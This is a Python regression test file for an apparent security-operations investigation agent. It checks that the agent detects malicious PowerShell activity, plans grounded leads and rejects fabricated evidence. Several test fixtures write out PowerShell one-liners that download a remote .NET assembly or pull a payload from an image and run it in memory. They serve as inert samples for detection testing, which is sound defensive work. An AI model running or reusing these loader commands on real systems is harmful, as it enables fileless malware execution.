"""v18 regression: PowerShell semantics, grounded graph planning and real loop."""
import asyncio

from bluesec1_agent.agent import InvestigationMemory, SimpleSGRAgent
from bluesec1_agent.investigation_director import InvestigationDirector
from bluesec1_agent.soc_v18 import SOCV18


def engine():
    return SOCV18(InvestigationDirector())


def memory_for_command(command, properties=None):
    memory = InvestigationMemory()
    memory.focus_ids = {'ps'}
    memory.absorb({'id':'ps','type':'windows_process',
                   'properties':{'cmdline':command, **(properties or {})}})
    return memory


def test_memory_assembly_load_download_bytes_and_invoke():
    m = memory_for_command('powershell -enc ', {
        'cmdline_decoded': '[Reflection.Assembly]::Load($wc.DownloadData("https://198.51.100.22/"))'
                           '.EntryPoint.Invoke($null,$null)'})
    names = {f.name:f for f in engine().findings(m)}
    assert names['dotnet_memory_assembly'].category == 'execution'
    assert names['remote_reflection_loader'].category == 'execution'
    assert names['remote_reflection_loader'].entity_ids == ('ps',)


def test_image_bitmap_payload_loader_is_not_mistaken_for_signed_sdelete():
    m = memory_for_command('powershell.exe', {
        'cmdline_decoded': '$img=[Drawing.Bitmap]::FromFile("render_12.png");'
                           '$x=$img.GetPixel(0,0);[Reflection.Assembly]::Load($bytes).'
                           'EntryPoint.Invoke($null,$null)'})
    names = {f.name for f in engine().findings(m)}
    assert 'image_payload_loader' in names
    assert 'dotnet_memory_assembly' in names


def test_ordinary_inventory_script_never_becomes_reflection_loader():
    m = memory_for_command('powershell -NoProfile -File inventory.ps1', {
        'script_text': 'Get-Service; Get-Process; Export-Csv C:\\reports\\inventory.csv'})
    assert not any(x.name in {'dotnet_memory_assembly', 'remote_reflection_loader',
                              'image_payload_loader'} for x in engine().findings(m))


def test_safe_encoded_command_decoding_without_execution():
    import base64
    payload = '[Reflection.Assembly]::Load($wc.DownloadData("https://example.test"))'
    encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
    m = memory_for_command('powershell.exe -EncodedCommand ' + encoded)
    assert any(x.name == 'remote_reflection_loader' for x in engine().findings(m))


def test_grounded_planner_prefers_changed_object_over_hub():
    m = memory_for_command('powershell.exe -File job.ps1')
    m.absorb({'id':'rel_write', 'type':'wrote_file',
              'source_id':'ps','target_id':'payload'})
    m.absorb({'id':'payload', 'type':'windows_file',
              'properties': {'path': 'C:\\Temp\\payload.exe'}})
    m.absorb({'id':'hub', 'type':'host','properties': {'hostname':'WK01'}})
    m.absorb({'id':'rhost', 'type':'hosts','source_id':'hub','target_id':'ps'})
    m.fetched_ids.add('ps')
    lead = engine().plan(m, {'get_entity','get_relation'})
    assert lead.tool == 'get_entity'
    assert lead.arguments['entity_id'] == 'payload'
    assert lead.priority >= 9


def test_hub_only_graph_does_not_fabricate_high_value_lead():
    m = memory_for_command('powershell -NoProfile -File inventory.ps1')
    m.absorb({'id':'hub', 'type':'host','properties': {'hostname':'WK01'}})
    m.absorb({'id':'rhost', 'type':'hosts','source_id':'hub','target_id':'ps'})
    m.fetched_ids.add('ps')
    lead = engine().plan(m, {'get_entity','get_relation'})
    assert lead is None or lead.priority < 7


def test_evidence_sanitizer_rejects_unseen_objects_and_fields():
    m = memory_for_command('powershell.exe')
    sub = {'verdict':'benign', 'reasoning':'sample', 'legitimacy_evidence':[
        {'anchor':'entity','entity_id':'fake', 'property_fields':['cmdline']},
        {'anchor':'entity','entity_id':'ps', 'property_fields':['fake_field']},
        {'anchor':'entity','entity_id':'ps', 'property_fields':['cmdline']},
    ]}
    cleaned, rejected = engine().sanitize(sub, m)
    assert rejected == 2
    assert len(cleaned['legitimacy_evidence']) == 1
    assert cleaned['legitimacy_evidence'][0]['entity_id'] == 'ps'


def test_unaddressed_inmemory_execution_requires_independent_challenge():
    m = memory_for_command('powershell.exe', {
        'script_text':'[Reflection.Assembly]::Load($wc.DownloadData("https://example.test"))'
                      '.EntryPoint.Invoke($null,$null)'})
    sub = {'verdict':'benign','legitimacy_evidence':[
        {'anchor':'entity','entity_id':'ps','property_fields':['cmdline']}],
        'reasoning':'Microsoft signed PowerShell'}
    assert any(f.name == 'remote_reflection_loader' for f in engine().unmet(m,sub))
    # An actual provenance citation can cover an operation, but merely citing
    # the actor process must never count as a complete explanation.


def test_v18_real_loop_chooses_real_relation_and_target():
    from test_v16_loop import FakeSession, FakeLLM
    session = FakeSession()
    agent = SimpleSGRAgent(FakeLLM(), max_steps=12, trajectory_dir=None,
                           review_enabled=True, gpt_oss_mode=True,
                           soc_v18_mode=True, v16_mode=False, security_mode=False)
    transcript = []
    result = asyncio.run(agent._investigate(session, transcript))
    assert result.completion_reason == 'terminated'
    assert [name for name, _ in session.calls] == [
        'get_entity','get_relation','get_entity','finish_investigation']
    assert sum('v18_active_plan' in str(m) for m in transcript) >= 2
